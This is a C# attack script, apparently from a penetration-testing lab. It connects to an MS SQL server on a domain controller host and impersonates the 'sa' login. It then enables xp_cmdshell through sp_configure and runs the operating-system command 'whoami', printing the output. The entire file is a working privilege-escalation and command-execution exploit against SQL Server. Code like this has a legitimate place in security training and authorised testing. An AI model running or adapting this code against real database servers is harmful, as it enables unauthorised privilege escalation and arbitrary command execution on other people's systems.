using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
       
        static void Main(string[] args)
        {
          String sqlServer = "dc01.corp1.com";
          
          //The default database in MS SQL is called “master”
          String database = "master";
          String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
          SqlConnection con = new SqlConnection(conString);
          
          try
          {
            con.Open();
            Console.WriteLine("Auth success!");
          }
          catch
          {
            Console.WriteLine("Auth failed");
            Environment.Exit(0);
          }
          String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
          //use the sp_configure stored procedure to activate the advanced options and then enable xp_cmdshell, RECONFIGURE is used to update the value 
          String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
          String execCmd = "EXEC xp_cmdshell whoami";
          //impersonate sa user
          SqlCommand command = new SqlCommand(impersonateUser, con);
          SqlDataReader reader = command.ExecuteReader();
          reader.Close();
          //enable xp cmd shell
          command = new SqlCommand(enable_xpcmd, con);
          reader = command.ExecuteReader();
          reader.Close();
          //run whoami command and print output
          command = new SqlCommand(execCmd, con);
          reader = command.ExecuteReader();
          reader.Read();
          Console.WriteLine("Result of command is: " + reader[0]);
          reader.Close();
    
        
          con.Close();         
          
        }
    }
}
